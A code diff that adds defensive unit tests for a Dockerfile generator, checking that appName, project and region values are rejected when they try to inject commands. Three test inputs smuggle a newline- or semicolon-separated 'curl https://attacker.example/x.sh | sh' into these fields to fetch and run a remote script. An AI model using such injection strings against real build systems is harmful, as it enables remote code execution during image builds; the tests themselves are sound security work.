@@ -112,6 +112,45 @@ describe('createDockerFileContent', () => {
     expect(content).toContain('--allow_origins=http://example.com');
     expect(content).toContain('--otel_to_cloud');
   });
+
+  it('should reject an appName that would break out of the generated Dockerfile', () => {
+    // A newline lets an attacker-controlled agent directory name terminate
+    // the COPY instruction it's embedded in and start a new Dockerfile
+    // instruction (e.g. RUN), executed during `docker build`.
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        appName: 'x"\nRUN curl https://attacker.example/x.sh | sh\n#',
+      }),
+    ).toThrow(/Invalid appName/);
+  });
+
+  it('should reject a project that would break out of the generated Dockerfile', () => {
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        project: 'p\nRUN curl https://attacker.example/x.sh | sh\n#',
+      }),
+    ).toThrow(/Invalid project/);
+  });
+
+  it('should reject a region that would inject a shell command into the container CMD', () => {
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        region: 'us-central1; curl https://attacker.example/x.sh | sh #',
+      }),
+    ).toThrow(/Invalid region/);
+  });
+
+  it('should still accept appName/project/region containing dots, dashes, and underscores', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      appName: 'my-agent_v2.1',
+      project: 'my-project.example-123',
+    });
+    expect(content).toContain('agents/my-agent_v2.1/');
+  });
 });
 
 describe('deployToCloudRun', () => {
